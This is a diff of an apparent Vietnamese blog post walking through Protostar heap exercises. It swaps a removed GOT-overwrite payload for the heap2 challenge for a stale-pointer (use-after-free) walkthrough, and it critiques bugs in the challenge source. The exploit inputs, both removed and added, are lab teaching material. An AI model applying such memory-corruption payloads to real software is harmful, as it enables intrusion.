@@ -3,7 +3,8 @@ layout: post
 title: heap2
 ---
 
-Trong bài này, chúng ta sẽ exploit heap để điều hướng chương trình.
+Trong bài này, chúng ta sẽ đọc hiểu và exploit chương trình với stale pointer.
+Stale pointer là pointer đã được free nhưng sau đó vẫn được gọi lại.
 Sau đây là source code và asm code của chương trình heap2.
 
 ```c
@@ -145,76 +146,137 @@ int main(int argc, char **argv)
 0x08048aaf <main+379>:  jmp    0x8048943 <main+15>
 ```
 
-Mục tiêu là gọi được hàm `winner`. `strcpy` có thể lợi dụng được để exploit chương trình.
-Sử dụng objdump hoặc gdb, ta tìm được địa chỉ của `winner` là `0x08048494`.
-Trong chương trình có sử dụng 2 lần `strcpy` và theo sau là `printf` (`puts` trong asm).
-Bản chất của lệnh `call puts@plt` là điều hướng chương trình về một bảng symbol do `puts` là external symbol (khác với `winner` hay `main` được định nghĩa trực tiếp trong source code).
-Ở các bài về `printf`, ta điều hướng chương trình bằng cách ghi lại giá dẫn đến hàm `puts` thực bằng một giá trị dẫn đến hàm mục tiêu.
-Dựa theo phỏng đoán, ta sẽ dùng `strcpy` lần đầu để ghi lại địa chỉ mà giá trị ở đó chứa địa chỉ của `puts` vào `i2->name`.
-Sau đó `strcpy` thứ hai sẽ đọc địa chỉ này, và ghi địa chỉ của `winner` vào đó.
+Mục tiêu là thay đổi giá trị `auth` trong một biến có type là struct `auth`.
+Chương trình heap2 sẽ làm những việc sau đây.
 
-Trước hết, chúng ta sẽ kiếm tra vị trí tương đối của 2 biến `i1` và `i2` trên bộ nhớ.
-Sau khi chạy thử chương trình với tham số bất kỳ, đây là bộ nhớ tại `esp`.
-Từ asm code, ta biết được địa chỉ của <span style="color:aqua">i1</span> và <span style="color:springgreen">i2</span> nằm lần lượt tại `esp + 0x14` và `esp + 0x18`.
+1. Chạy một vòng loop vô hạn
+2. Mỗi lượt, chương trình sẽ đọc lệnh do người dùng nhập vào stdin. Ta có cách lệnh:
+* auth <string>
+* reset
+* service <stirng>
+* login
+3. Khi một lệnh được nhập vào, chương trình sẽ thực hiện một chuỗi lệnh khác nhau.
+
+Tuy nhiên cũng cần lưu ý trước là chương trình có khá nhiều bug sau khi đọc asm code so với source code.
+Vì vậy, trước hết, chúng ta sẽ giả định chương trình hoạt động theo đúng "mong muốn" ban đầu và chúng ta sẽ exploit chương trình theo hướng stale pointer.
+Các bug sẽ được đề cập sau.
+
+Đối với gợi ý exploit sử dụng stale pointer, ta để ý rằng biến pointer `auth` được `free` khi nhận lệnh reset.
+Tuy nhiên sau khi `free`, biến này vẫn có khả năng được sử dụng nếu người dùng nhập lệnh login.
+Để exploit stale pointer, chúng ta sẽ giả thiết rằng sau khi free, chúng ta vẫn có thể gán lại địa chỉ này cho một biến khác và có thể ghi vào đó.
+Theo đó, ta sẽ chọn flow cho chương trình như sau.
+
+1. Khởi tạo địa chỉ cho `auth` qua `malloc`. Việc này được thực hiện qua lệnh auth
+2. Free địa chỉ này, chỉ để trả quyền sử dụng cho một biến khác. Việc này được thực hiện qua lệnh reset
+3. Xin cấp lại một địa chỉ trên heap với mục tiêu lấy lại quyền ghi vào vùng chứa biến int `auth` thuộc struct `auth`. Việc này được thực hiện qua lệnh service. Chúng ta sẽ hy vọng rằng biến mới có địa chỉ nhỏ hơn địa chỉ đến int `auth` trong struct.
+4. Sau khi cấp địa chỉ, ghi một giá trị vào đó để cố gắng làm tràn đến int `auth`.
+5. Dùng lệnh login để kiểm tra mục tiêu.
+
+Với flow này, ta kiểm tra chương trình, <span style="color:springgreen">thông tin</span> và <span style="color:aqua">nhập vào</span>, theo từng bước như sau.
 
 <pre class="memory">
-0xbffff770:     0x00000008      0xb7fd7ff4      0x08048580      0xbffff798
-0xbffff780:     0xb7ec6365      <span style="color:aqua">0x0804a008</span>      <span style="color:springgreen">0x0804a028</span>      0xb7fd7ff4
-0xbffff790:     0x08048580      0x00000000      0xbffff818      0xb7eadc76
+<span style="color:springgreen">[ auth = (nil), service = (nil) ]</span>
+<span style="color:aqua">auth abcd</span>
+<span style="color:springgreen">[ auth = 0x804c008, service = (nil) ]</span>
+<span style="color:aqua">service 1</span>
+<span style="color:springgreen">[ auth = 0x804c008, service = 0x804c018 ]</span>
 </pre>
 
-Với cấu trúc của struct `internet`, 4 byte đầu sẽ là `priority` và 4 byte sau là địa chỉ của `name`.
-Như vậy, offset của `name` với địa chỉ của biến sẽ là 0x04.
-Ta sẽ suy ra được, trong trường hợp này, vị trí của `i1->name` và `i2->name` là `0x0804a00c` và `0x0804a02c`.
-Bộ nhớ tại thời điêm trước sau khi `malloc` biến sẽ như sau.
+Ở đoạn ví dụ trên, chúng ta không free `auth` mà tiếp tục xin cấp bộ nhớ trên heap.
+Địa chỉ của `auth` và `service` là `0x804c008` và `0x804c018`, khác nhau.
+Nếu có `free` trước khi xin cấp bộ nhớ cho biến `service`, ta có kết quả như sau.
 
 <pre class="memory">
-0x804a008:      0x00000001      <span style="color:aqua">0x0804a018</span>      0x00000000      0x00000011
-<span style="color:aqua">0x804a018</span>:      0x00000000      0x00000000      0x00000000      0x00000011
-0x804a028:      0x00000002      <span style="color:springgreen">0x0804a038</span>      0x00000000      0x00000011
-<span style="color:springgreen">0x804a038</span>:      0x00000000      0x00000000      0x00000000      0x00020fc1
+<span style="color:springgreen">[ auth = (nil), service = (nil) ]</span>
+<span style="color:aqua">auth abcd</span>
+<span style="color:springgreen">[ auth = 0x804c008, service = (nil) ]</span>
+<span style="color:aqua">reset</span>
+<span style="color:springgreen">[ auth = 0x804c008, service = (nil) ]</span>
+<span style="color:aqua">service 1</span>
+<span style="color:springgreen">[ auth = 0x804c008, service = 0x804c008 ]</span>
 </pre>
 
-Hai địa chỉ tương ứng này là `0x0804a018` và `0x0804a038`.
-Với kiểu layout này, lần chạy `strcpy` đầu tiên ta có thể lưu tràn từ địa chỉ của `i1->name` tại `0x0804a018` qua vị trí lưu `name` trên biến `i2` là `0x0804a02c`.
-Như vậy, tham số đầu tiên của chương trình sẽ cần 24 byte, trong đó 20 byte đầu để làm phần đệm và 4 byte cuối chứa địa chỉ của `puts` trên bảng lookup symbol `got.plt`.
-Sau đây là vị trí trên bộ nhớ. Phân biệt theo màu với <span style="color:yellow">địa chỉ lệnh gọi đến symbol puts@plt</span>, <span style="color:orangered">địa chỉ chứa symbol puts@plt trên bảng got.plt</span>, và <span style="color:fuchsia">địa chỉ thực của puts@plt, cần thay thế bằng địa chi của winner</span>.
-<pre class="memory">
-0x8048561 <main+168>    call   <span style="color:yellow">0x80483cc <puts@plt></span>
-...
-<span style="color:yellow">0x80483cc <puts@plt></span>:   jmp    DWORD PTR ds:<span style="color:orangered">0x8049774</span>
-...
-<span style="color:orangered">0x8049774</span> <_GLOBAL_OFFSET_TABLE_+36>:   <span style="color:fuchsia">0x080483d2</span>
-</pre>
-
-4 byte cuối cùng sẽ là `0x8049774`.
-Như vậy ta sẽ dựng tham số đầu tiên như sau.
-
-```bash
-python -c 'print "AAAA" * 5 + "\x74\x97\x04\x08"'
-```
-
-Tham số thứ hai sẽ là địa chỉ của `winner`.
-
-```bash
-python -c 'print "\x94\x84\x04\x08"'
-```
-
-Như vậy, chúng ta sẽ chạy chương trình với input như sau.
-Lưu ý cần khoảng trống giữa hai tham số.
-
-```bash
-python -c 'print "AAAA" * 5 + "\x74\x97\x04\x08" + " " + "\x94\x84\x04\x08"'
-```
+Lúc này, `service` đã lấy lại giá trị cũ của `auth`.
+Hai biến này về cơ bản là có cùng địa chỉ.
+Như vậy thay vì chạy lệnh service 1, ta sẽ vẫn dùng lệnh này nhưng với giá trị nhập vào đủ lớn để ghi được qua vị trí của int `auth` trong `auth`.
+Với struct `auth` và pointer `auth`, ta sẽ phân bố vùng nhớ gồm 32 byte đầu cho `auth->name` và 4 byte sau cho `auth->auth`.
+Như vậy, ta sẽ dùng chuỗi dài ít nhất 33 byte với byte cuối khác `\0` cho lệnh service.
+Như sau là một cách.
 
 <pre class="memory">
-<span style="color:aqua">and we have a winner @ 1687025943</span>
+<span style="color:springgreen">[ auth = (nil), service = (nil) ]</span>
+<span style="color:aqua">auth abcd</span>
+<span style="color:springgreen">[ auth = 0x804c008, service = (nil) ]</span>
+<span style="color:aqua">reset</span>
+<span style="color:springgreen">[ auth = 0x804c008, service = (nil) ]</span>
+<span style="color:aqua">service 11112222333344441</span>
+<span style="color:springgreen">[ auth = 0x804c008, service = 0x804c018 ]</span>
+<span style="color:aqua">login</span>
+<span style="color:springgreen">you have logged in already!</span>
+<span style="color:springgreen">[ auth = 0x804c008, service = 0x804c018 ]</span>
 </pre>
 
 Mục tiêu đã hoàn thành!
 
+Tuy nhiên!
+
+Tuy nhiên, chúng ta thấy chương trình báo rằng `service` thực sự nằm ở `0x804c018` thay vì trùng với `auth` tại `0x804c008`.
+Việc này cùng một số quan sát khác và bug của chương trình, mình sẽ liệt ra như sau.
+
+* Tác giả sử dụng quá nhiều thứ với tên `auth`. Khi đọc bài viết, hẳn các bạn cũng sẽ bị rố. Trong chương trình có struct tên `auth`, trong struct có biến int tên `auth`, và ngoài struct là biến global pointer trên `auth`. Không rõ có phải hay không nhưng do cách đặt tên này làm cả tác giả bị lẫn. Khi xin cấp bộ nhớ cho pointer `auth`, tác giả dùng `sizeof` với struct nhưng thật sự chương trình đã compile thành `sizeof` với biến pointer. Và đúng ra sẽ xin cấp 36 byte bộ nhớ nhưng lại thành cấp 4 byte. Việc này được thể hiện cả trong asm code của chương trình.
+* Một số lệnh được viết khá cẩu thả. Ví dụ như lệnh service. Đúng ra tác giá sẽ muốn dùng `strncmp` với độ dài là 7 ký tự, nhưng chương trình viết thành 6. Do đó, nếu bạn chạy lệnh servic thì điều kiện lệnh vẫn thỏa mãn. Hoặc nếu dùng lệnh service thì ký tự dấu cách sau service cũng được tính để ghi thành chuỗi thay vì làm thành phần lệnh.
+* Với ví dụ cuối cùng, mặc dù đã `free` biến `auth` nhưng khi cấp bộ nhớ, biến `service` vẫn nhận một địa chỉ mới. Mình đã thử và thấy nếu chuỗi đi với lệnh service có trên 12 byte thì `service` sẽ nhận địa chỉ mới.
+* Cũng cần lưu ý rằng nếu nhập lệnh service thì ký tự cuối sẽ là `\0x0a` (line feed) và null-terminated character. Như vậy chỉ cần 10 ký tự theo sau lệnh thì tổng số ký tự sẽ là 12.
+
+```bash
+user@protostar:~$ heap2
+[ auth = (nil), service = (nil) ]
+auth abcd
+[ auth = 0x804c008, service = (nil) ]
+reset
+[ auth = 0x804c008, service = (nil) ]
+servic 1111222233
+[ auth = 0x804c008, service = 0x804c008 ]
+```
+
+```bash
+user@protostar:~$ heap2
+[ auth = (nil), service = (nil) ]
+auth abcd
+[ auth = 0x804c008, service = (nil) ]
+reset
+[ auth = 0x804c008, service = (nil) ]
+servic 11112222333
+[ auth = 0x804c008, service = 0x804c018 ]
+```
+
+Phần source code này thực sự khá cẩu thả nên về cơ bản chúng ta chỉ cần nắm được lý thuyết về stale pointer sau bài này là ổn.
+
 ## Ref
 ```bash
-user@protostar:~$ heap1 $(python -c 'print "AAAA" * 5 + "\x74\x97\x04\x08" + " " + "\x94\x84\x04\x08"')
-and we have a winner @ 1687025943
+user@protostar:~$ heap2
+[ auth = (nil), service = (nil) ]
+auth abcd
+[ auth = 0x804c008, service = (nil) ]
+reset
+[ auth = 0x804c008, service = (nil) ]
+service 11112222333344441
+[ auth = 0x804c008, service = 0x804c018 ]
+login
+you have logged in already!
+[ auth = 0x804c008, service = 0x804c018 ]
+```
+
+```bash
+user@protostar:~$ heap2
+[ auth = (nil), service = (nil) ]
+auth abcd
+[ auth = 0x804c008, service = (nil) ]
+reset
+[ auth = 0x804c008, service = (nil) ]
+servic 1111222233334444
+[ auth = 0x804c008, service = 0x804c018 ]
+login
+you have logged in already!
+[ auth = 0x804c008, service = 0x804c018 ]
 ```
